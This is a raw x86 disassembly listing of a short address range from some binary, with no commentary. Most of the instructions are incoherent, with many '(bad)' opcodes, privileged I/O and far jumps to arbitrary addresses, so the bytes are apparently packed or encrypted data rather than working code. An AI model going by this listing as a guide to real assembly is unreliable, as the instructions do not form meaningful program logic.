  4043b7:	push   0x2d
  4043b9:	or     eax,0x2cf33ee0
  4043bf:	fistp  WORD PTR [edx+ebx*8]
  4043c2:	mov    edx,0x94489bcc
  4043c7:	fiadd  DWORD PTR [edx-0x4cdccbd]
  4043cd:	mov    esp,0xa4db3f80
  4043d2:	adc    ecx,DWORD PTR [edi]
  4043d4:	mov    ch,0x43
  4043d6:	push   edx
  4043d7:	push   edx
  4043d8:	je     0x4043a1
  4043da:	xchg   esi,eax
  4043db:	hlt    
  4043dc:	fisubr WORD PTR [ecx+edi*2-0x48]
  4043e0:	dec    ecx
  4043e1:	ins    DWORD PTR es:[edi],dx
  4043e2:	jge    0x404426
  4043e4:	mov    dh,0xf6
  4043e6:	(bad)  
  4043e7:	push   cs
  4043e8:	mov    cs,WORD PTR [ebp+0x23a3d5e5]
  4043ee:	and    BYTE PTR [edi],0xb7
  4043f1:	fisub  WORD PTR [edi]
  4043f3:	dec    ebx
  4043f4:	leave  
  4043f5:	xor    al,0x9f
  4043f7:	sbb    esi,esp
  4043f9:	pusha  
  4043fa:	stc    
  4043fb:	scas   al,BYTE PTR es:[edi]
  4043fc:	mov    al,0xbb
  4043fe:	fisubr WORD PTR [edx+0x74]
  404401:	out    0x8e,al
  404403:	cmp    DWORD PTR fs:[edx+0x6d880d98],ecx
  40440a:	jmp    0x404482
  40440c:	ins    BYTE PTR es:[edi],dx
  40440d:	ss dec esp
  40440f:	add    eax,DWORD PTR [edx-0x15c929a9]
  404415:	fcomi  st,st(7)
  404417:	xchg   ebx,eax
  404418:	mov    edi,0x7f503d78
  40441d:	mov    es:0x2538b3e1,al
  404423:	push   cs
  404424:	xchg   esi,eax
  404425:	imul   ecx,eax,0x64
  404428:	pop    es
  404429:	mov    ebx,0xf11892f9
  40442e:	cs inc ebx
  404430:	mov    WORD PTR [eax+0x52],es
  404433:	mov    dl,0x7e
  404435:	or     al,BYTE PTR ds:0x99f21ef6
  40443b:	adc    DWORD PTR [ebp-0x9],edi
  40443e:	in     eax,dx
  40443f:	mov    ecx,0xfa5ed8d4
  404444:	dec    esp
  404445:	lahf   
  404446:	xchg   ebx,eax
  404447:	retf   
  404448:	xchg   BYTE PTR [edx-0x48a81cb2],al
  40444e:	or     BYTE PTR [ecx],dl
  404450:	pusha  
  404451:	jmp    0xac063c3c
  404456:	and    eax,0x2def6f59
  40445b:	jne    0x4044bd
  40445d:	cmp    eax,0xde641457
  404462:	xchg   DWORD PTR [ecx+0x73fe3161],esp
  404468:	jnp    0x40448e
  40446a:	push   0xdf0bb684
  40446f:	mov    ebp,0x7c3460bd
  404474:	mov    ch,0x7b
  404476:	imul   esp,DWORD PTR [esp+eax*8-0x9666272],0x60
  40447e:	cld    
  40447f:	das    
  404480:	push   edi
  404481:	push   ebp
  404482:	inc    edi
  404483:	push   edx
  404484:	push   ecx
  404485:	leave  
  404486:	(bad)  
  404487:	pop    edx
  404488:	bswap  esp
  40448a:	into   
  40448b:	cmp    bh,BYTE PTR [ebx+0x10572d0e]
  404491:	or     DWORD PTR [ecx-0x1f],ebp
  404494:	jmp    0xb001ed2a
  404499:	xor    al,0x90
  40449b:	in     eax,0xf2
  40449d:	adc    esi,DWORD PTR ds:0xba3b049e
  4044a3:	dec    esp
  4044a4:	inc    DWORD PTR cs:[ecx+0x722505a4]
  4044ab:	jmp    0x404452
  4044ad:	(bad)  
  4044ae:	adc    ebx,edx
  4044b0:	jle    0x4044ad
  4044b2:	and    eax,0x5a14d267
  4044b7:	test   BYTE PTR [ebx+0x8175a2e],al
  4044bd:	loop   0x40449c
  4044bf:	push   0xb9bfed94
  4044c4:	mov    ch,0x47
  4044c6:	outs   dx,BYTE PTR ds:[esi]
  4044c7:	and    DWORD PTR [ebp-0x56ea9a6a],esi
  4044cd:	mov    cs,edi
  4044cf:	sahf   
  4044d0:	sub    esi,DWORD PTR ds:0x1338feb7
  4044d6:	mov    eax,0x381fed63
  4044db:	mov    ebx,0x7b986673
  4044e0:	test   ebx,edx
  4044e2:	adc    al,0x43
  4044e4:	mov    eax,0xbcccf974
  4044e9:	outs   dx,BYTE PTR ds:[esi]
  4044ea:	sbb    dl,BYTE PTR [ebx]
  4044ec:	ds inc ebx
  4044ee:	pushf  
  4044ef:	sbb    al,0x39
  4044f1:	jae    0x404538
  4044f3:	and    BYTE PTR [edi+0x56c0021e],bh
  4044f9:	xor    BYTE PTR [ecx],al
  4044fb:	mov    dl,0x52
  4044fd:	inc    edx
  4044fe:	jp     0x4044f4
  404500:	dec    ebx
  404501:	fistp  WORD PTR [edi+eiz*4-0x69]
  404505:	inc    ebp
  404506:	int    0x72
  404508:	mov    dh,0x66
  40450a:	stos   DWORD PTR es:[edi],eax
  40450b:	and    dl,BYTE PTR [edx]
  40450d:	push   0xffffffa9
  40450f:	sub    BYTE PTR [eax],ch
  404511:	les    esi,FWORD PTR [edi-0x14]
  404514:	imul   edi,DWORD PTR [ecx-0x76],0x15611496
  40451b:	fbld   TBYTE PTR [edx]
  40451d:	dec    ebx
  40451e:	push   0xc9788c64
  404523:	fisttp WORD PTR [ebx-0x14]
  404526:	mov    ecx,0x26d6feb5
  40452b:	loope  0x4044b1
  40452d:	push   edx
  40452e:	sub    eax,0xd993f418
  404533:	cli    
  404534:	enter  0x8229,0xed
  404538:	sbb    DWORD PTR [ecx-0x17928106],edx
  40453e:	hlt    
  40453f:	mov    cl,0xbe
  404541:	mov    WORD PTR [ebp-0x1de0ffac],?
  404547:	cmp    DWORD PTR [esi],eax
  404549:	and    DWORD PTR [ebx+0x458fdb17],eax
  40454f:	loop   0x4045bb
  404551:	mov    dl,0xd1
  404553:	(bad)
  404557:	lods   al,BYTE PTR ds:[esi]
  404558:	clc    
  404559:	cmp    DWORD PTR [ebp-0x7a],ebp
  40455c:	inc    eax
  40455d:	fcom   DWORD PTR [edi-0x6e]
  404560:	sub    eax,0x307fda86
  404565:	push   ebx
  404566:	jmp    0x9a2d:0xd6f67f3
  40456d:	add    DWORD PTR ds:0xef442516,ebp
  404573:	mov    eax,ds:0x50df53d3
  404578:	push   es
  404579:	test   eax,0xd91fa07c
  40457e:	imul   ebp,DWORD PTR [esi-0x6ebb2396],0xffffffa4
  404585:	in     eax,dx
  404586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404587:	mov    ecx,0x325d9404
  40458c:	mov    esi,eax
  40458e:	ror    BYTE PTR [ebx+edx*4-0x2a],1
  404592:	scas   al,BYTE PTR es:[edi]
  404593:	cmp    al,0x70
  404595:	leave  
  404596:	scas   eax,DWORD PTR es:[edi]
  404597:	xchg   ebx,eax
  404598:	push   ecx
  404599:	add    al,0x31
  40459b:	fild   QWORD PTR [ebp-0x52]
  40459e:	jp     0x404604
  4045a0:	add    eax,esp
  4045a2:	dec    edi
  4045a3:	mov    ebp,0xcf5db0e4
  4045a8:	add    BYTE PTR [ecx-0x42fef1d7],0x61
  4045af:	pop    ecx
  4045b0:	loop   0x40459e
  4045b2:	sub    BYTE PTR [edi],bh
  4045b4:	cwde   
  4045b5:	pop    esi
  4045b6:	add    eax,0x25d62e8d
  4045bb:	ja     0x4045f6
  4045bd:	aas    
  4045be:	test   al,0x11
  4045c0:	stos   DWORD PTR es:[edi],eax
  4045c1:	mov    ah,0x3a
  4045c3:	ss in  eax,dx
  4045c5:	sbb    DWORD PTR [ebp-0x5d51372b],edi
  4045cb:	mov    BYTE PTR [ebx+0x37],0x16
  4045cf:	and    edx,DWORD PTR [edx+0xc053979]
  4045d5:	aad    0xe3
  4045d7:	aam    0x67
  4045d9:	mov    ebx,0x6990b432
  4045de:	jbe    0x40459a
  4045e0:	cs sahf 
  4045e2:	test   DWORD PTR [eax+0x71dab54b],0xafc84b37
  4045ec:	add    edi,eax
  4045ee:	push   ebx
  4045ef:	fcompp 
  4045f1:	rcl    DWORD PTR [esi+eiz*4-0x464a040c],0x21
  4045f9:	stc    
  4045fa:	mov    cl,0x4c
  4045fc:	pop    eax
  4045fd:	loope  0x404597
  4045ff:	xchg   ebx,eax
  404600:	(bad)
  404604:	aad    0xf9
  404606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404607:	lods   eax,DWORD PTR ds:[esi]
  404608:	xlat   BYTE PTR ds:[ebx]
  404609:	sub    al,0x6c
  40460b:	out    dx,eax
  40460c:	in     al,dx
  40460d:	in     al,dx
  40460e:	lock sahf 
  404610:	or     esp,DWORD PTR [ebx+0x729bfb9f]
  404616:	xor    al,0x5d
  404618:	xchg   esp,eax
  404619:	shr    BYTE PTR [ebx-0x17ca2628],1
  40461f:	je     0x40467f
  404621:	and    eax,DWORD PTR [ebx-0x6436d493]
  404627:	gs push ebx
  404629:	lods   al,BYTE PTR ds:[esi]
  40462a:	pop    ds
  40462b:	xchg   BYTE PTR [ebp+0x4b],cl
  40462e:	add    DWORD PTR [edi],ebx
  404630:	xchg   edi,eax
  404631:	loopne 0x404621
  404633:	mov    ecx,0x876e206a
  404638:	or     ah,al
  40463a:	pop    ebp
  40463b:	xchg   ebx,eax
  40463c:	sbb    cl,BYTE PTR [ebp+0x77]
  40463f:	jnp    0x404664
  404641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404642:	stc    
  404643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404644:	fadd   QWORD PTR [esp+eax*4+0x5e3a5962]
  40464b:	fsubrp st(6),st
  40464d:	cmp    edi,DWORD PTR [ebp+ebp*2+0x72]
  404651:	pusha  
  404652:	push   ds
  404653:	mov    dh,0x36
  404655:	xchg   ecx,eax
  404656:	sbb    cl,BYTE PTR [eax]
  404658:	in     eax,0xc3
  40465a:	std    
  40465b:	push   ebx
  40465c:	mov    dh,BYTE PTR [eax]
  40465e:	mov    ch,0xf9
  404660:	mov    ds:0xf3659586,al
  404665:	sub    al,BYTE PTR [ebx]
  404667:	sar    DWORD PTR [ebp+0x50],cl
  40466a:	pop    esi
  40466b:	imul   edi,eax,0xffffffce
  40466e:	fs popa 
  404670:	loop   0x4046d6
  404672:	test   DWORD PTR [esi+0x621f91a0],edi
  404678:	xor    al,BYTE PTR [edi+eiz*4-0x2e1aac9b]
  40467f:	push   ebp
  404680:	jecxz  0x40468e
  404682:	sti    
  404683:	inc    esp
  404684:	(bad)  
  404685:	lahf   
  404686:	(bad)  [edx+0x2f1a0057]
  40468c:	jnp    0x4046dc
  40468e:	call   0x5389:0x271a7e2b
  404695:	aad    0xdd
  404697:	adc    al,0x24
  404699:	imul   ebp,ebp,0xf327f752
  40469f:	call   FWORD PTR ss:[ecx+0x7b]
  4046a3:	call   0x96ca:0xd8fa415
  4046aa:	jno    0x404694
  4046ac:	and    DWORD PTR [edi],edx
  4046ae:	pop    edx
  4046af:	push   ss
  4046b0:	shr    DWORD PTR [edi-0x58],cl
  4046b3:	or     BYTE PTR [eax-0x3108d652],dl
  4046b9:	or     edi,DWORD PTR [edi+0x49b510b9]
  4046bf:	xor    al,0xd5
  4046c1:	sbb    eax,0x6e085b1e
  4046c6:	mov    bl,0x58
  4046c8:	mov    BYTE PTR [ebp+0x77],bh
  4046cb:	mov    WORD PTR [eax+0x19],ds
  4046ce:	push   ebx
  4046cf:	push   edx
  4046d0:	test   eax,0x9d5e9dfa
  4046d5:	daa    
  4046d6:	lahf   
  4046d7:	lahf   
  4046d8:	sub    cl,al
  4046da:	pop    esi
  4046db:	add    al,0xd0
  4046dd:	sub    eax,0x26976e7a
  4046e2:	cmp    DWORD PTR ds:0xc6956b34,esi
  4046e8:	cmp    al,0x23
  4046ea:	adc    eax,0x9b058fee
  4046ef:	push   esp
  4046f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f1:	stos   BYTE PTR es:[edi],al
  4046f2:	pop    es
  4046f3:	mov    bl,0x1b
  4046f5:	xor    BYTE PTR [ebx-0x43],cl
  4046f8:	xor    al,0x78
  4046fa:	imul   BYTE PTR [ecx-0x665e21e6]
  404700:	(bad)  
  404701:	sbb    al,0x90
  404703:	pop    ss
  404704:	mov    bl,0xea
  404706:	pushw  ds
  404708:	xchg   esp,eax
  404709:	push   es
  40470a:	or     eax,0x94af14
  40470f:	cmp    edi,DWORD PTR [ebp-0x3a]
  404712:	inc    edx
  404713:	mov    ah,0x93
  404715:	and    DWORD PTR [edi-0x5e],edi
  404718:	cmp    BYTE PTR ds:0x31afb17f,dl
  40471e:	loopne 0x404774
  404720:	ret    
  404721:	out    0xdb,eax
  404723:	shl    BYTE PTR [edx],1
  404725:	mov    edi,0xeec96f6d
  40472a:	lods   eax,DWORD PTR ds:[esi]
  40472b:	popf   
  40472c:	ror    ch,0x5e
  40472f:	add    dh,BYTE PTR [esi+0x21]
  404732:	call   FWORD PTR [edi-0x7cd8f6fb]
  404738:	cmp    cl,BYTE PTR [ecx-0x40]
  40473b:	xlat   BYTE PTR ds:[ebx]
  40473c:	shrd   ecx,edx,0x2
  404740:	or     DWORD PTR ds:0x4282d3,0x42828f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x4282af
  404753:	or     DWORD PTR ds:0x4283af,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0x70d1f993
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    dh,dl
  40477a:	pop    edx
  40477b:	icebp  
  40477c:	xor    BYTE PTR [ecx],bl
  40477e:	sub    DWORD PTR [eax],0xe8b3dbb7
  404784:	xor    DWORD PTR [ecx+0x45],ecx
  404787:	push   0x852dfb5
  40478c:	rcl    bl,0x0
  40478f:	jmp    0x3e486a9d
  404794:	enter  0x4086,0x5c
  404798:	mov    al,0xb2
  40479a:	gs or  esp,esi
  40479d:	pusha  
  40479e:	rcl    BYTE PTR [ebx],0x59
  4047a1:	push   ss
  4047a2:	sets   BYTE PTR [edx+0x28acdbd6]
  4047a9:	shr    DWORD PTR [ecx+0x714c37f9],1
  4047af:	push   cs
  4047b0:	or     esi,DWORD PTR [ebx-0x3e]
  4047b3:	lods   eax,DWORD PTR ds:[esi]
  4047b4:	xchg   esi,ecx
  4047b6:	fwait
  4047b7:	sub    ah,BYTE PTR [ebx-0x68dfcedb]
  4047bd:	ins    DWORD PTR es:[edi],dx
  4047be:	stos   BYTE PTR es:[edi],al
  4047bf:	cmp    DWORD PTR [esi],edi
  4047c1:	push   ebp
  4047c2:	sbb    al,0x4c
  4047c4:	(bad)  
  4047c5:	push   0xffffff9a
  4047c7:	pop    ebx
  4047c8:	push   edi
  4047c9:	xchg   ebp,eax
  4047ca:	repz cli 
  4047cc:	mov    eax,ds:0x600613c0
  4047d1:	push   ecx
  4047d2:	daa    
  4047d3:	sbb    DWORD PTR [ebp-0x7b6a5b75],0x20
  4047da:	lahf   
  4047db:	popa   
  4047dc:	mov    ebp,0x4b8e95b9
  4047e1:	xchg   esp,eax
  4047e2:	arpl   WORD PTR ds:0xcab124d1,ax
  4047e8:	ret    0x55cc
  4047eb:	hlt    
  4047ec:	mov    esi,0x79aa9499
  4047f1:	dec    edx
  4047f2:	mov    ebp,0x333e127
  4047f7:	dec    edi
  4047f8:	jecxz  0x4047b4
  4047fa:	sbb    eax,0x5e282f7b
  4047ff:	lea    ecx,[edi]
  404801:	inc    eax
  404802:	pop    es
  404803:	jmp    0x404854
  404805:	push   esi
  404806:	or     cl,BYTE PTR [ebx]
  404808:	addr16 fchs 
  40480b:	jns    0x4047b2
  40480d:	shl    DWORD PTR [edx-0x63d573e5],cl
  404813:	inc    edi
  404814:	es push cs
  404816:	pusha  
  404817:	push   es
  404818:	je     0x40483f
  40481a:	je     0x404884
  40481c:	push   cs
  40481d:	icebp  
  40481e:	mov    bh,0x23
  404820:	fstp   QWORD PTR ds:0xc7d4385c
  404826:	mov    ecx,0x159855f4
  40482b:	gs call 0x8866:0xd1d3c742
  404833:	inc    eax
  404834:	dec    ebx
  404835:	fsub   DWORD PTR [ebx+0x45]
  404838:	nop
  404839:	mov    edi,esp
  40483b:	cmp    BYTE PTR [edx-0x7c],cl
  40483e:	inc    eax
  40483f:	jmp    0xbed7:0x662700a9
  404846:	and    eax,0x93a0c038
  40484b:	int    0x3
  40484d:	jo     0x4047f5
  40484f:	mov    esi,0xa64ee714
  404854:	pop    ss
  404855:	push   0xfee4688a
  40485a:	add    al,0xc6
  40485c:	fadd   QWORD PTR [eax+0x19]
  40485f:	stos   DWORD PTR es:[edi],eax
  404860:	lods   al,BYTE PTR ds:[esi]
  404861:	jae    0x4048c9
  404863:	fs cmp dl,dh
  404866:	out    dx,al
  404867:	lock jne 0x4048ca
  40486a:	or     DWORD PTR [ebp+0x76],eax
  40486d:	xchg   edi,eax
  40486e:	outs   dx,DWORD PTR ds:[esi]
  40486f:	mov    eax,0xfc048a98
  404874:	sub    DWORD PTR [edx-0x4e8d91e8],ecx
  40487a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40487b:	jecxz  0x40480c
  40487d:	mov    dh,0xcc
  40487f:	ins    BYTE PTR es:[edi],dx
  404880:	inc    DWORD PTR [edi+0x1a]
  404883:	xchg   edi,eax
  404884:	(bad)  
  404885:	sti    
  404886:	fstp   DWORD PTR [eax-0x26ca3739]
  40488c:	stos   BYTE PTR es:[edi],al
  40488d:	ret    0xb692
  404890:	sar    ch,0xfd
  404893:	loopne 0x404819
  404895:	retf   
  404896:	jg     0x404823
  404898:	mov    esp,0xdba88f67
  40489d:	pop    ebx
  40489e:	loop   0x404884
  4048a0:	xchg   ebp,eax
  4048a1:	mov    cl,0xc
  4048a3:	xor    bh,BYTE PTR [edi-0x16]
  4048a6:	test   BYTE PTR [eax-0x7c],bl
  4048a9:	shr    DWORD PTR [ecx],cl
  4048ab:	push   cs
  4048ac:	lea    esi,[ebx+0x2e525101]
  4048b2:	inc    ecx
  4048b3:	pop    esi
  4048b4:	xlat   BYTE PTR ds:[ebx]
  4048b5:	lock ins BYTE PTR es:[edi],dx
  4048b7:	mov    dh,0x38
  4048b9:	xchg   DWORD PTR [ebx],esi
  4048bb:	xchg   ebx,eax
  4048bc:	jbe    0x404893
  4048be:	adc    ebp,ecx
  4048c0:	in     al,dx
  4048c1:	jle    0x40487f
  4048c3:	dec    esi
  4048c4:	inc    esi
  4048c5:	imul   eax,DWORD PTR [ebx-0x1a33590c],0x7d
  4048cc:	mov    ebp,0x4975a86a
  4048d1:	adc    DWORD PTR [edx+0x5c],0x3f
  4048d5:	mov    dh,0x2c
  4048d7:	repnz scas eax,DWORD PTR es:[edi]
  4048d9:	sar    BYTE PTR ds:0x5b118092,1
  4048df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e0:	inc    ebx
  4048e1:	scas   al,BYTE PTR es:[edi]
  4048e2:	rol    DWORD PTR [esi],0xec
  4048e5:	retf   
  4048e6:	repz sub esp,DWORD PTR [eax]
  4048e9:	sub    DWORD PTR [ebx],ebx
  4048eb:	sub    cl,0xab
  4048ee:	push   ds
  4048ef:	leave  
  4048f0:	push   edi
  4048f1:	lea    ebp,[ecx-0x44a01ae1]
  4048f7:	in     al,0x6b
  4048f9:	sub    ebx,edx
  4048fb:	aam    0xdf
  4048fd:	fs xchg esp,eax
  4048ff:	cs pop edx
  404901:	loopne 0x4048ef
  404903:	jl     0x4048c6
  404905:	or     DWORD PTR [edx+eax*4],esp
  404908:	dec    edi
  404909:	frstor [edx-0x7a]
  40490c:	xchg   DWORD PTR [eax],esi
  40490e:	fadd   DWORD PTR [eax]
  404910:	int3   
  404911:	pop    esp
  404912:	ret    
  404913:	jl     0x404921
  404915:	(bad)  
  404917:	pop    ds
  404918:	sub    BYTE PTR [edx+eax*1-0x76256eb1],bh
  40491f:	ret    0x88b4
  404922:	push   cs
  404923:	cli    
  404924:	fmul   QWORD PTR [eax+edi*1]
  404927:	mov    esi,0x6d2a907a
  40492c:	dec    ecx
  40492d:	mov    ah,0xb9
  40492f:	js     0x404999
  404931:	in     eax,dx
  404932:	xchg   ah,al
  404934:	sub    ebx,edi
  404936:	add    edi,DWORD PTR [eax-0x2a]
  404939:	lahf   
  40493a:	outs   dx,DWORD PTR ds:[esi]
  40493b:	ffreep st(2)
  40493d:	adc    DWORD PTR [ebp-0x5e],esp
  404940:	mov    ?,esp
  404942:	cmp    al,0xa3
  404944:	sahf   
  404945:	jp     0xa0f7e64c
  40494b:	dec    esp
  40494c:	idiv   BYTE PTR cs:[ecx-0x4c]
  404950:	std    
  404951:	rcr    DWORD PTR [ebx-0x4bc6677b],cl
  404957:	cdq    
  404958:	pop    esi
  404959:	xor    dh,bl
  40495b:	fimul  WORD PTR [eax-0x1cae725e]
  404961:	jne    0x4049be
  404963:	enter  0x197c,0x44
  404967:	out    dx,al
  404968:	lods   eax,DWORD PTR ds:[esi]
  404969:	dec    eax
  40496a:	hlt    
  40496b:	fist   DWORD PTR ds:0xcf4910ac
  404971:	fwait
  404972:	arpl   WORD PTR [ebx+esi*4+0x2d],bp
  404976:	test   eax,0x11d9c68b
  40497b:	jae    0x4049eb
  40497d:	adc    eax,0xecb1846a
  404982:	adc    al,0xf1
  404984:	f2xm1  
  404986:	dec    ecx
  404987:	jb     0x4049f7
  404989:	fdiv   st,st(6)
  40498b:	or     al,0xeb
  40498d:	ins    BYTE PTR es:[edi],dx
  40498e:	or     eax,0xb60c4109
  404993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404994:	add    edx,DWORD PTR [ebp+0x2aec41e2]
  40499a:	xor    al,0xb
  40499c:	loope  0x40498f
  40499e:	stos   BYTE PTR es:[edi],al
  40499f:	add    BYTE PTR [edx+0x1d14ed60],dl
  4049a5:	dec    ecx
  4049a6:	adc    esi,DWORD PTR [ebp-0x73c3c71d]
  4049ac:	add    DWORD PTR [ebx-0x29],ebp
  4049af:	ret    
  4049b0:	pop    ds
  4049b1:	cmp    eax,0xdc93ecf1
  4049b6:	push   ebx
  4049b7:	call   0x803ed60f
  4049bc:	clc    
  4049bd:	into   
  4049be:	scas   al,BYTE PTR es:[edi]
  4049bf:	mov    dl,0x1a
  4049c1:	xor    DWORD PTR [edx+0x4021c402],ecx
  4049c7:	mov    ds:0xb2720e37,al
  4049cc:	addr16 sub al,0x3e
  4049cf:	mov    bl,0x28
  4049d1:	into   
  4049d2:	data16 mov bh,0xaf
  4049d5:	fidiv  WORD PTR [ebp-0x2]
  4049d8:	icebp  
  4049d9:	inc    ecx
  4049da:	out    dx,eax
  4049db:	loop   0x404a0b
  4049dd:	inc    edx
  4049de:	fiadd  WORD PTR [edx]
  4049e0:	enter  0x6ceb,0x50
  4049e4:	outs   dx,BYTE PTR ds:[esi]
  4049e5:	jne    0x404a35
  4049e7:	inc    esi
  4049e8:	dec    edi
  4049e9:	ror    ah,cl
  4049eb:	cdq    
  4049ec:	mov    esi,0x21090603
  4049f1:	mov    eax,DWORD PTR [ecx-0x73cf11c4]
  4049f7:	clc    
  4049f8:	or     BYTE PTR [ebx-0x2f],bl
  4049fb:	jecxz  0x404a50
  4049fd:	sbb    eax,0xaee37914
  404a02:	cmp    DWORD PTR [ecx],esi
  404a04:	add    BYTE PTR [edx+0x580b2d0b],ch
  404a0a:	shl    BYTE PTR [ebx],1
  404a0c:	cs pushf 
  404a0e:	scas   eax,DWORD PTR es:[edi]
  404a0f:	pop    esp
  404a10:	push   es
  404a11:	pop    ss
  404a12:	fstp   DWORD PTR [ecx+0x2f260cf2]
  404a18:	push   ebx
  404a19:	xchg   edx,eax
  404a1a:	inc    ecx
  404a1b:	mov    bl,ah
  404a1d:	xor    eax,0x9cfded6c
  404a22:	fmul   st,st(4)
  404a24:	pop    edi
  404a25:	push   eax
  404a26:	sbb    dl,al
  404a28:	pop    esi
  404a29:	imul   edx,edi,0x969be0ae
  404a2f:	repnz inc edi
  404a31:	call   0x9341:0x316b1ce1
  404a38:	add    DWORD PTR [edx-0x2be87e0e],ebp
  404a3e:	(bad)  
  404a3f:	and    al,0x41
  404a41:	out    dx,eax
  404a42:	xor    al,0xd3
  404a44:	xchg   edx,eax
  404a45:	clc    
  404a46:	ret    
  404a47:	mov    bl,BYTE PTR [ebp+edi*4+0x0]
  404a4b:	xchg   edx,eax
  404a4c:	jo     0x404a92
  404a4e:	dec    edx
  404a4f:	fwait
  404a50:	cmc    
  404a51:	pop    edi
  404a52:	cld    
  404a53:	daa    
  404a54:	push   cs
  404a55:	mov    esp,0xeca1eb00
  404a5a:	outs   dx,BYTE PTR ds:[esi]
  404a5b:	push   ebp
  404a5c:	mov    ah,0xc
  404a5e:	sahf   
  404a5f:	sub    dl,BYTE PTR [edi]
  404a61:	mov    cl,0x1b
  404a63:	out    0x10,al
  404a65:	loopne 0x404acc
  404a67:	outs   dx,DWORD PTR ds:[esi]
  404a68:	pop    ebx
  404a69:	(bad)  [ecx+0x4c243a93]
  404a6f:	or     ah,bl
  404a71:	ins    BYTE PTR es:[edi],dx
  404a72:	sub    ebx,ebp
  404a74:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404a76:	stc    
  404a77:	add    dh,dh
  404a79:	retf   0xb69d
  404a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a7d:	push   edi
  404a7e:	push   ebp
  404a7f:	dec    edi
  404a80:	cmp    ebx,DWORD PTR [ebp+edi*8-0x3e]
  404a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a85:	fwait
  404a86:	nop
  404a87:	imul   edi,DWORD PTR [esi-0x12fda126],0xc167bc3a
  404a91:	scas   eax,DWORD PTR es:[edi]
  404a92:	mov    cl,0xd7
  404a94:	stc    
  404a95:	popa   
  404a96:	ja     0x404b13
  404a98:	mov    bl,0xda
  404a9a:	(bad)  
  404a9b:	push   ebx
  404a9c:	popa   
  404a9d:	pop    ebx
  404a9e:	out    0xe,al
  404aa0:	xchg   esi,eax
  404aa1:	adc    eax,0x96f268ef
  404aa6:	mov    ds:0xe03494cc,eax
  404aab:	test   BYTE PTR [edx+edx*1],al
  404aae:	pop    ss
  404aaf:	or     DWORD PTR [esi+ebx*4-0x4a9f998e],0xffffff8f
  404ab7:	jmp    0x319704f2
  404abc:	pop    ecx
  404abd:	and    esp,DWORD PTR [eax-0x24]
  404ac0:	dec    ecx
  404ac1:	ds daa 
  404ac3:	push   ss
  404ac4:	scas   eax,DWORD PTR es:[edi]
  404ac5:	in     eax,0xf9
  404ac7:	jg     0x404a89
  404ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aca:	jb     0x404b42
  404acc:	repz ror DWORD PTR [edi+eax*8-0x2a],cl
  404ad1:	and    edx,DWORD PTR [edi]
  404ad3:	enter  0xe1c2,0x2b
  404ad7:	sub    esp,esi
  404ad9:	add    al,0xa9
  404adb:	fwait
  404adc:	stos   DWORD PTR es:[edi],eax
  404add:	aam    0x38
  404adf:	retf   
  404ae0:	aaa    
  404ae1:	cmp    DWORD PTR [ebp+edx*2-0xa],ecx
  404ae5:	push   0x3b
  404ae7:	sbb    DWORD PTR [ebx+0x58],ebp
  404aea:	mov    cl,0xa9
  404aec:	ins    DWORD PTR es:[edi],dx
  404aed:	jns    0x404b48
  404aef:	or     al,0x77
  404af1:	cmp    dl,BYTE PTR [ebx]
  404af3:	lds    ebx,FWORD PTR [ebx+0x2a]
  404af6:	push   ebp
  404af7:	mov    ebx,0xd3fe8bf
  404afc:	sub    eax,0x83c8b868
  404b01:	add    eax,DWORD PTR [ecx+ebp*4]
  404b04:	outs   dx,BYTE PTR ds:[esi]
  404b05:	mov    eax,0x716ba4e5
  404b0a:	jmp    0x90f737e1
  404b0f:	call   0x31c1:0xc9bc5959
  404b16:	sbb    eax,0xd17c2fe4
  404b1b:	repz pop esp
  404b1d:	loope  0x404b4c
  404b1f:	in     eax,0xcc
  404b21:	icebp  
  404b22:	ret    
  404b23:	imul   ch
  404b25:	lods   al,BYTE PTR ds:[esi]
  404b26:	mov    WORD PTR [edx+ebx*2+0x43],gs
  404b2a:	hlt    
  404b2b:	push   ecx
  404b2c:	inc    esi
  404b2d:	mov    bl,0xf7
  404b2f:	xchg   ebx,ecx
  404b31:	push   esp
  404b32:	xor    edx,DWORD PTR [ebx+0x5e]
  404b35:	lds    ebx,FWORD PTR [edx-0x74f069f0]
  404b3b:	or     ecx,DWORD PTR [ebx+0x7d310453]
  404b41:	in     al,0x81
  404b43:	add    eax,0x4282c3
  404b48:	aaa    
  404b49:	add    DWORD PTR [edx+0x0],0x33
  404b4d:	shr    cl,cl
  404b4f:	fld    DWORD PTR [ebx]
  404b51:	add    BYTE PTR [eax],al
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	jbe    0x404b7e
  404b61:	repnz push 0x60
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [esi+0x4f],al
  404b6d:	sub    DWORD PTR [eax],0xffffffb1
  404b70:	rcl    bh,1
  404b72:	mov    dh,0x95
  404b74:	xchg   ebp,eax
  404b75:	dec    edi
  404b76:	addr16 push edx
  404b78:	in     eax,0x7d
  404b7a:	(bad)  
  404b7b:	iret   
  404b7c:	out    dx,al
  404b7d:	pop    edx
